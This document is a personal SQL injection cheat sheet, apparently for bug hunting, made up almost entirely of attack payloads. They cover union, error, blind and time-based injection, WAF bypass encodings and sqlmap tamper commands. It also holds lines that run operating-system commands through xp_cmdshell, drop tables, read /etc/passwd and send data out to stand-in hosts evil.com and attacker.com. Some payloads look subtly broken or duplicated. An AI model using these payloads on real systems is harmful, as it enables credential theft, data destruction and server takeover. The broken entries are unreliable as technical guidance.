# SQL Injection Techniques

Here are some SQL Injection Techniques I normally use. Happy Hunting!

### 1. Advanced Payloads and Techniques

#### Error-Based SQL Injection
- **Advanced Error Payloads**:
  ```sql
  ' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- -
  ```

#### Union-Based Injection
- **Determining the Number of Columns**:
  ```sql
  ' UNION SELECT NULL, NULL, NULL, NULL -- 
  ```
- **Extracting Data**:
  ```sql
  ' UNION SELECT username, password, NULL, NULL FROM users -- 
  ```

#### Blind SQL Injection
- **Boolean-Based Blind**:
  ```sql
  ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END) -- 
  ```
- **Time-Based Blind**:
  ```sql
  ' AND IF(1=1, SLEEP(5), 0) -- 
  ```

#### Second-Order SQL Injection
- **Injection in Profile Information**:
  Modify data stored in one place to affect queries executed elsewhere.

### 2. Advanced Enumeration

#### Database Fingerprinting
- **MySQL**:
  ```sql
  ' OR 1=1 AND @@version -- 
  ```
- **PostgreSQL**:
  ```sql
  ' OR 1=1 AND version() -- 
  ```
- **MSSQL**:
  ```sql
  ' OR 1=1 AND @@version -- 
  ```

#### Column Enumeration
- **Determine the Number of Columns**:
  ```sql
  ' ORDER BY 1 -- 
  ' ORDER BY 2 -- 
  ```
- **Extract Column Names**:
  ```sql
  ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- 
  ```

#### Advanced Data Extraction
- **Combine Multiple Rows into a Single Output**:
  ```sql
  ' UNION SELECT GROUP_CONCAT(username, 0x3a, password) FROM users -- 
  ```

### 3. Bypassing Filters and WAFs

#### Obfuscation
- **Using Comments**:
  ```sql
  ' UNION/**/SELECT/**/NULL,NULL,NULL -- 
  ```

#### Case Manipulation
- **Changing the Case of SQL Keywords**:
  ```sql
  ' uNioN SeLecT NULL, NULL -- 
  ```

#### Inline Comments
- **Inserting Inline Comments**:
  ```sql
  ' UNION/**/SELECT/**/NULL,NULL -- 
  ```

#### Whitespace Manipulation
- **Using Different Types of Whitespace Characters**:
  ```sql
  ' UNION%0D%0ASELECT%0D%0A NULL,NULL -- 
  ```

### 4. Exploiting Advanced Scenarios

#### Stored Procedures
- **Execute Arbitrary SQL**:
  ```sql
  '; EXEC xp_cmdshell('whoami') --
  ```

#### Out-of-Band SQL Injection
- **Exfiltrate Data via DNS or HTTP Requests**:
  ```sql
  '; EXEC master..xp_dirtree '\\evil.com\payload' --
  ```

#### Leveraging Privileges
- **Reading or Writing Files**:
  ```sql
  ' UNION SELECT LOAD_FILE('/etc/passwd') --
  ```

### 5. Automation and Custom Scripts

#### Custom SQLMap Commands
- **Bypass WAFs or Target Specific Injection Points**:
  ```sh
  sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=space2comment --level=5 --risk=3
  ```
- **Some Tamper Scripts I use**
  ```tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords```
  
### 6. 

### 7. Some More Techniques

#### Stacked Queries
- **Executing Multiple Statements**:
  ```sql
  '; DROP TABLE users; SELECT * FROM admin -- 
  ```

#### SQLi with Web Application Firewalls
- **Using Obfuscated Payloads**:
  ```sql
  ' UNION SELECT CHAR(117,115,101,114,110,97,109,101), CHAR(112,97,115,115,119,111,114,100) -- 
  ```

#### Leveraging SQL Functions
- **Using SQL Functions for Data Exfiltration**:
  ```sql
  ' UNION SELECT version(), current_database() -- 
  ```

#### DNS Exfiltration
- **Using DNS Requests for Data Exfiltration**:
  ```sql
  '; SELECT load_file('/etc/passwd') INTO OUTFILE '\\\\attacker.com\\share' -- 
  ```

#### Leveraging JSON Functions
- **Extracting Data Using JSON Functions**:
  ```sql
  ' UNION SELECT json_extract(column_name, '$.key') FROM table_name -- 
  ```

### 8. Advanced Automation Techniques

#### SQLMap Customization
- **Using Custom Tamper Scripts**:
  ```sh
  sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=~/location/ofthescript/charencode.py --level=5 --risk=3
  ```
## WAF Bypass Techniques for SQL Injection

### 1. Using Encoding and Obfuscation

#### URL Encoding
- Encode parts of the payload to bypass basic keyword detection.
  ```sql
  %27%20UNION%20SELECT%20NULL,NULL,NULL--
  ```

#### Double URL Encoding
- Double encode the payload to evade detection mechanisms.
  ```sql
  %2527%2520UNION%2520SELECT%2520NULL,NULL,NULL--
  ```

#### Hex Encoding
- Use hexadecimal encoding for the payload.
  ```sql
  ' UNION SELECT 0x61646D696E, 0x70617373776F7264 --
  ```

### 2. Case Manipulation and Comments

#### Mixed Case
- Change the case of SQL keywords.
  ```sql
  ' uNioN SeLecT NULL, NULL --
  ```

#### Inline Comments
- Insert comments within SQL keywords to obfuscate the payload.
  ```sql
  ' UNION/**/SELECT/**/NULL,NULL --
  ```

### 3. Whitespace and Special Characters

#### Using Different Whitespace Characters
- Replace spaces with other whitespace characters like tabs or newlines.
  ```sql
  ' UNION%0D%0ASELECT%0D%0A NULL,NULL --
  ```

#### Concatenation with Special Characters
- Use special characters and concatenation to build the payload dynamically.
  ```sql
  ' UNION SELECT CHAR(117)||CHAR(115)||CHAR(101)||CHAR(114), CHAR(112)||CHAR(97)||CHAR(115)||CHAR(115) --
  ```

### 4. SQL Function and Command Obfuscation

#### String Concatenation
- Break strings into smaller parts and concatenate them.
  ```sql
  ' UNION SELECT 'ad'||'min', 'pa'||'ss' --
  ```

#### Using SQL Functions
- Leverage SQL functions to manipulate the payload.
  ```sql
  ' UNION SELECT VERSION(), DATABASE() --
  ```

### 5. Time-Based and Boolean-Based Payloads

#### Time-Based Blind SQL Injection
- Use time delays to infer information from the response.
  ```sql
  ' AND IF(1=1, SLEEP(5), 0) --
  ```

#### Boolean-Based Blind SQL Injection
- Use conditions that alter the response based on true or false conditions.
  ```sql
  ' AND IF(1=1, 'A', 'B')='A' --
  ```

### 6. Advanced Encoding Techniques

#### Base64 Encoding
- Encode payloads using Base64.
  ```sql
  ' UNION SELECT FROM_BASE64('c2VsZWN0IHZlcnNpb24oKQ==') --
  ```

#### Custom Encoding Scripts
- Create custom scripts to encode and decode payloads in different formats.

### 7. Chaining Techniques

#### Combining Multiple Bypass Techniques
- Use a combination of techniques to create a more complex and harder-to-detect payload.
  ```sql
  %27%20UNION/**/SELECT/**/CHAR(117)%7C%7CCHAR(115)%7C%7CCHAR(101)%7C%7CCHAR(114),%20CHAR(112)%7C%7CCHAR(97)%7C%7CCHAR(115)%7C%7CCHAR(115)%20--%0A
  ```

### 8. Leveraging Lesser-Known SQL Features

#### Using JSON Functions
- Leverage JSON functions to manipulate and extract data.
  ```sql
  ' UNION SELECT json_extract(column_name, '$.key') FROM table_name --
  ```

#### Using XML Functions
- Utilize XML functions to create more complex payloads.
  ```sql
  ' UNION SELECT extractvalue(1, 'version()') --
  ```
## Techniques to Force Errors from Databases for SQL Injection

Forcing errors in databases can help reveal valuable information about the underlying SQL queries, database structure, and sometimes even the data itself. Here are some advanced techniques to force errors from various databases:

### 1. Syntax Errors

#### Classic Syntax Error
- Introduce a deliberate syntax error to elicit an error message.
  ```sql
  ' OR 1=1; -- 
  ```

#### Unclosed Quotes
- Leave a quote unclosed to generate an error.
  ```sql
  ' OR 'a'='a
  ```

### 2. Type Conversion Errors

#### Invalid Type Casting
- Cast a string to an integer to cause a type conversion error.
  ```sql
  ' UNION SELECT CAST('abc' AS SIGNED) --
  ```

### 3. Function-Based Errors

#### Division by Zero
- Force a division by zero error.
  ```sql
  ' UNION SELECT 1/0 --
  ```

#### Invalid Function Usage
- Use a function incorrectly to trigger an error.
  ```sql
  ' UNION SELECT EXP('abc') --
  ```

### 4. Subquery Errors

#### Invalid Subquery
- Use a subquery in a way that causes an error.
  ```sql
  ' UNION SELECT (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS temp) --
  ```

### 5. Database-Specific Errors

#### MySQL Errors
- Use invalid queries to trigger MySQL-specific errors.
  ```sql
  ' UNION SELECT GTID_SUBSET('abc', 'def') --
  ```

#### PostgreSQL Errors
- Use invalid operations to cause PostgreSQL errors.
  ```sql
  ' UNION SELECT TO_NUMBER('abc', '999') --
  ```

#### MSSQL Errors
- Use MSSQL-specific functions incorrectly to trigger errors.
  ```sql
  ' UNION SELECT CONVERT(INT, 'abc') --
  ```

### 6. Information Schema Queries

#### Invalid Table Name
- Query the information schema with an invalid table name.
  ```sql
  ' UNION SELECT table_name FROM information_schema.tables WHERE table_name = 'non_existent_table' --
  ```

### 7. Blind SQL Injection Errors

#### Deliberate False Condition
- Use a false condition to force an error indirectly.
  ```sql
  ' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='non_existent_database') --
  ```

### 8. Advanced Error Techniques

#### Recursive Queries
- Use recursive queries to force errors.
  ```sql
  ' UNION SELECT 1 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4) AS temp WHERE temp=1 --
  ```

#### Invalid Hexadecimal Values
- Use invalid hexadecimal values to trigger errors.
  ```sql
  ' UNION SELECT 0xZZ --
  ```

### 9. Combining Techniques

#### Chained Error Forcing
- Combine multiple error-forcing techniques for more robust results.
  ```sql
  ' UNION SELECT CONVERT(INT, 'abc') UNION SELECT 1/0 UNION SELECT TO_NUMBER('abc', '999') --
  ```
